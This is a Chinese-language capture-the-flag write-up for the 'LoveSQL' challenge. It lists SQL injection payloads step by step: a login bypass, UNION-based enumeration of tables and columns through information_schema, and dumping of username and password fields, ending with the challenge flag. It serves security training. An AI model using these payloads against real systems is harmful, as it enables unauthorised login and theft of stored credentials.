## LoveSQL

很明显的sql注入

先用万能账号`1' or 1=1;#`，密码随便填，成功回显

```sql
看回显列
用户名：1' order by 1;    #注到4时报错

注表
用户名：1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database();#
得到  geekuser,l0ve1ysq1

注列名
用户名：1'union select 1,2,group_concat(column_name) from information_schema.columns where table_name='geekuser';#
得到  id,username,password 没有看到flag，先注下一个列名
用户名：1'union select 1,2,group_concat(column_name) from information_schema.columns where table_name='l0ve1ysq1';#
得到  id,username,password 也没有flag，那就一个一个查吧

注数据
用户名：1'union select group_concat(id) from geekuser;#
用户名：1'union select group_concat(username) from geekuser;#
用户名：1'union select group_concat(password) from geekuser;#
用户名：1'union select group_concat(id) from l0ve1ysq1;#
用户名：1'union select group_concat(username) from l0ve1ysq1;#
用户名：1'union select group_concat(password) from l0ve1ysq1;#
最终在l0ve1ysq1的password中查到flag
flag{05e26eda-5852-44c4-aa1c-35949499c319}
```

